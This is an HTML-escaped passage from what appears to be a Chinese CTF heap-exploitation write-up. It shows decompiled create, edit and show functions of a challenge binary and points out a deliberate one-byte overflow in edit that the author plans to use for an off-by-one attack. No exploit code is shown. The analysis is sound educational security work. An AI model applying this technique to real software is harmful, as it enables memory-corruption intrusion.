class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;create_heap&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  trr *v0; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-2Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-28h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-20h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*(&amp;amp;heaparray + i) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(&amp;amp;heaparray + i) = (trr *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*(&amp;amp;heaparray + i) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Allocate Error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of Heap : &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;8uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      size = atoi(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v0 = *(&amp;amp;heaparray + i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v0-&amp;gt;ptr = (__int64)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(*(&amp;amp;heaparray + i))-&amp;gt;ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Allocate Error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (*(&amp;amp;heaparray + i))-&amp;gt;size = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content of heap:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read_input((*(&amp;amp;heaparray + i))-&amp;gt;ptr, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;SuccessFul&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;read_input&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *a1, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, a1, a2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)result &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看 creat 的时候，首先可以看看是否存在溢出的可能。但是这道题这里没有什么溢出的可能。但是可以修改堆块的 prev_size&lt;/p&gt;
&lt;h3 id=&#34;edit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#edit&#34;&gt;#&lt;/a&gt; Edit&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;edit_heap&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;4uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = atoi(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || v1 &amp;gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Out of bound!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(&amp;amp;heaparray + v1) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content of heap : &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read_input((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(*(&amp;amp;heaparray + v1))-&amp;gt;ptr, (*(&amp;amp;heaparray + v1))-&amp;gt;size + &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x01&amp;#x27;&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;// 1字节溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;No such heap !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是当我们看到 edit 函数的时候，但到了这里有一个非常显眼的 1 字节溢出，所以后续考虑 OFF_BY_ONE 攻击手法与其他手法配合使用&lt;/p&gt;
&lt;h3 id=&#34;show&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#show&#34;&gt;#&lt;/a&gt; Show&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;show_heap&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;4uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = atoi(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || v1 &amp;gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Out of bound!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(&amp;amp;heaparray + v1) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size : %ld\nContent : %s\n&amp;quot;&lt;/span&gt;, (*(&amp;amp;heaparray + v1))-&amp;gt;size, (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)(*(&amp;amp;heaparray + v1))-&amp;gt;ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;No such heap !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v3;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;show 这里也没有什么特殊的，&lt;/p&gt;
&lt;h3 id=&#34;free&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#free&#34;&gt;#&lt;/a&gt; Free&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span 